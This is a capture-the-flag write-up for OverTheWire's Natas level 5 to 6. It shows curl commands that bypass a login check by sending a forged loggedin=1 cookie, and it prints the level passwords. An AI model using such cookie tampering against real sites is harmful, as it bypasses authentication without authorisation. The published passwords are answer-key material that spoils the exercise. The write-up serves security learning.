# Natas Level 05 to 06

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 5 -> 6 |
| Status | Complete |

## Objective

Bypass a cookie-controlled login check.

## Given Access

User: `natas5`

Password:

```text
0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

## Method

The response sets `loggedin=0`. Send `loggedin=1` instead.

## Commands

```bash
curl -i -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org/
curl -s -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \
  -b loggedin=1 \
  http://natas5.natas.labs.overthewire.org/
```

## Result

Password for `natas6`:

```text
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

## Lesson

Unsigned client-side cookies are user input. Treat them as attacker-controlled.

## References

- https://overthewire.org/wargames/natas/
